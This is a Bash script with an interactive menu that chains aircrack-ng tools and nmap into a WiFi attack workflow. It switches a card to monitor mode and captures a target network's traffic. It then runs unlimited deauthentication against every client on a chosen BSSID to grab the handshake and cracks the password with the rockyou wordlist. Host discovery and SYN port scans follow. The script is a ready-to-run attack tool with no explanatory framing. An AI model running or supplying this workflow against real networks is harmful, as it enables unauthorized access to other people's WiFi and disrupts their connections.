#!/bin/bash

# Colors for better output readability
green="\e[32m"
red="\e[31m"
endcolor="\e[0m"

# Check if the script is run as root
if [ "$EUID" -ne 0 ]; then
    echo -e "${red}Please run this script as root.${endcolor}"
    exit
fi

# Function to display menu
display_menu() {
    echo -e "${green}Choose an operation:${endcolor}"
    echo "1) Enable Monitor Mode"
    echo "2) Discover Access Points"
    echo "3) Monitor Specific BSSID"
    echo "4) Capture Traffic for a Specific BSSID"
    echo "5) Deauthenticate Devices on a Network and Capture Traffic"
    echo "6) Crack WiFi Password"
    echo "7) Find Network Range"
    echo "8) Scan Network for Connected Devices"
    echo "9) Scan Ports on a Specific Device"
    echo "10) Check Firewall Status and Add Rules"
    echo "11) Revert to Managed Mode"
    echo "0) Exit"
    read -p "Enter your choice: " choice
}

# Function to enable monitor mode
enable_monitor_mode() {
    read -p "Enter your wireless interface (e.g., wlan0): " interface
    echo -e "${green}Selected Network Interface: $interface${endcolor}"
    sudo airmon-ng check
    sudo airmon-ng check kill
    sudo airmon-ng start $interface
    echo -e "${green}Monitor mode enabled on $interface.${endcolor}"
}

# Function to discover access points
discover_access_points() {
    read -p "Enter your wireless interface (e.g., wlan0mon): " interface
    echo -e "${green}Selected Network Interface: $interface${endcolor}"
    sudo airodump-ng $interface
}

# Function to monitor a specific BSSID
monitor_bssid() {
    read -p "Enter your wireless interface (e.g., wlan0mon): " interface
    read -p "Enter the BSSID (MAC address) of the network: " bssid
    echo -e "${green}Selected Network Interface: $interface | Monitoring BSSID: $bssid${endcolor}"
    sudo airodump-ng $interface -d $bssid
}

# Function to capture traffic for a specific BSSID
capture_traffic() {
    read -p "Enter your wireless interface (e.g., wlan0mon): " interface
    read -p "Enter the BSSID (MAC address) of the network: " bssid
    read -p "Enter the channel of the network: " channel
    read -p "Enter the filename to save captures: " filename
    echo -e "${green}Selected Network Interface: $interface | Capturing Traffic for BSSID: $bssid on Channel: $channel${endcolor}"
    sudo airodump-ng -w $filename -c $channel --bssid $bssid $interface
}

# Function to deauthenticate devices and capture traffic
deauth_and_capture() {
    read -p "Enter your wireless interface (e.g., wlan0mon): " interface
    read -p "Enter the BSSID (MAC address) of the network: " bssid
    read -p "Enter the channel of the network: " channel
    read -p "Enter the filename to save captures: " filename

    echo -e "${green}Selected Network Interface: $interface | Deauthenticating Devices on BSSID: $bssid and Capturing Traffic on Channel: $channel${endcolor}"
    # Start capturing traffic in the background
    sudo airodump-ng -w $filename -c $channel --bssid $bssid $interface &
    airodump_pid=$!

    # Start deauthenticating devices
    sudo aireplay-ng --deauth 0 -a $bssid $interface

    # Stop capturing traffic when deauthentication stops
    kill $airodump_pid
    echo -e "${green}Deauthentication and traffic capture completed. Captures saved to ${filename}-01.cap.${endcolor}"
}

# Function to crack WiFi password
crack_password() {
    read -p "Enter the capture file (e.g., hack1-01.cap): " capture_file
    read -p "Enter the wordlist file (default: /usr/share/wordlists/rockyou.txt): " wordlist
    wordlist=${wordlist:-/usr/share/wordlists/rockyou.txt}
    echo -e "${green}Cracking Password Using Wordlist: $wordlist${endcolor}"
    sudo aircrack-ng $capture_file -w $wordlist
}

# Function to find network range
find_network_range() {
    echo -e "${green}Available Network Interfaces:${endcolor}"
    ip addr show | grep -E '^[0-9]+:|inet '
    read -p "Enter your network interface (e.g., wlan0): " interface
    echo -e "${green}Selected Network Interface: $interface${endcolor}"
    ip addr show $interface | grep -w inet | awk '{print $2}'
}

# Function to scan network for connected devices
scan_network() {
    read -p "Enter your network range (e.g., 192.168.196.0/24): " network_range
    echo "1) Nmap Scan"
    echo "2) ARP Scan"
    echo "3) Netdiscover"
    read -p "Choose a scanning tool: " tool_choice
    case $tool_choice in
        1) echo -e "${green}Using Nmap to Scan Network: $network_range${endcolor}"; sudo nmap -sn $network_range ;;
        2) echo -e "${green}Using ARP Scan for Local Network${endcolor}"; sudo apt install -y arp-scan && sudo arp-scan --localnet ;;
        3) echo -e "${green}Using Netdiscover to Scan Network: $network_range${endcolor}"; sudo apt install -y netdiscover && sudo netdiscover -r $network_range ;;
        *) echo -e "${red}Invalid choice.${endcolor}" ;;
    esac
}

# Function to scan ports on a specific device
scan_ports() {
    read -p "Enter the IP address of the device: " ip_address
    echo -e "${green}Scanning Ports on Device with IP: $ip_address${endcolor}"
    sudo nmap -sS -T4 $ip_address
    echo -e "${green}Scanned Ports:${endcolor}"
    sudo nmap -sS -T4 $ip_address | grep open
}

# Function to check firewall status and add rules
check_firewall() {
    echo -e "${green}Checking Uncomplicated Firewall (UFW) Status:${endcolor}"
    sudo ufw status
    read -p "Do you want to add a rule to allow traffic from a specific IP? (y/n): " add_rule
    if [[ $add_rule == "y" || $add_rule == "Y" ]]; then
        read -p "Enter the IP address to allow: " ip_address
        sudo ufw allow from $ip_address
        echo -e "${green}Rule added to allow traffic from $ip_address.${endcolor}"
    fi
}

# Function to revert to managed mode
revert_to_managed_mode() {
    read -p "Enter your wireless interface (e.g., wlan0mon): " interface
    echo -e "${green}Reverting $interface to Managed Mode${endcolor}"
    sudo ifconfig $interface down
    sudo iwconfig $interface mode managed
    sudo ifconfig $interface up
    sudo systemctl restart NetworkManager
    echo -e "${green}Reverted to managed mode.${endcolor}"
}

# Main script loop
while true; do
    display_menu
    case $choice in
        1) enable_monitor_mode ;;
        2) discover_access_points ;;
        3) monitor_bssid ;;
        4) capture_traffic ;;
        5) deauth_and_capture ;;
        6) crack_password ;;
        7) find_network_range ;;
        8) scan_network ;;
        9) scan_ports ;;
        10) check_firewall ;;
        11) revert_to_managed_mode ;;
        0) echo -e "${green}Exiting script.${endcolor}"; exit ;;
        *) echo -e "${red}Invalid choice, please try again.${endcolor}" ;;
    esac
    echo
done
